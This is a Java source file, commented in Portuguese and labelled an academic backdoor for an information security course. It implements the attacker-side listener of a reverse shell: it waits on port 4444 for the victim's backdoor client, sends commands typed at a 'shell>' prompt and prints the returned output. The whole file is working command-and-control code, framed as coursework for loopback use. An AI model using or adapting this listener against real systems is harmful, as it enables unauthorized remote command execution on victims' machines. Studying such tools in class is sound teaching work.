import java.io.*;
import java.net.*;

/**
 * ============================================================
 *  BACKDOOR ACADEMICO - Servidor do Atacante (Listener)
 *  Disciplina: Segurança da Informação
 *  Descrição : Aguarda a conexão TCP reversa da máquina vítima.
 *              Após a conexão, permite o envio de comandos e
 *              exibe os resultados no terminal local.
 *
 *  USO EXCLUSIVO EM AMBIENTE CONTROLADO / LOOPBACK (127.0.0.1)
 * ============================================================
 */
public class AttackerServer {

    // Porta em que o servidor irá escutar conexões
    private static final int PORT = 4444;

    // Comando que encerra a sessão
    private static final String EXIT_CMD = "exit";

    public static void main(String[] args) {
        System.out.println("[*] Servidor iniciado. Aguardando conexão na porta " + PORT + "...");

        // Cria o socket servidor que aceita conexões TCP
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {

            // Bloqueia até que a vítima (BackdoorClient) se conecte
            Socket clientSocket = serverSocket.accept();
            System.out.println("[+] Conexão recebida de: " + clientSocket.getInetAddress().getHostAddress());

            // Fluxo de saída: envia comandos para a vítima
            PrintWriter out = new PrintWriter(
                    new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream())), true);

            // Fluxo de entrada: recebe o output dos comandos executados na vítima
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(clientSocket.getInputStream()));

            // Lê comandos digitados pelo atacante no terminal local
            BufferedReader consoleIn = new BufferedReader(new InputStreamReader(System.in));

            System.out.println("[*] Sessão ativa. Digite comandos ('exit' para encerrar):\n");

            String command;
            while (true) {
                System.out.print("shell> ");

                // Lê o comando digitado pelo atacante
                command = consoleIn.readLine();

                if (command == null || command.trim().isEmpty()) {
                    continue;
                }

                // Envia o comando para a vítima via socket
                out.println(command);

                // Verifica se é o comando de saída
                if (command.trim().equalsIgnoreCase(EXIT_CMD)) {
                    System.out.println("[*] Encerrando conexão...");
                    break;
                }

                // Lê a resposta da vítima linha por linha
                // O protocolo usa "##END##" como marcador de fim de saída
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = in.readLine()) != null) {
                    if (line.equals("##END##")) {
                        break; // Fim da saída do comando atual
                    }
                    response.append(line).append("\n");
                }

                System.out.println(response);
            }

        } catch (IOException e) {
            System.err.println("[!] Erro de I/O: " + e.getMessage());
        }

        System.out.println("[*] Servidor encerrado.");
    }
}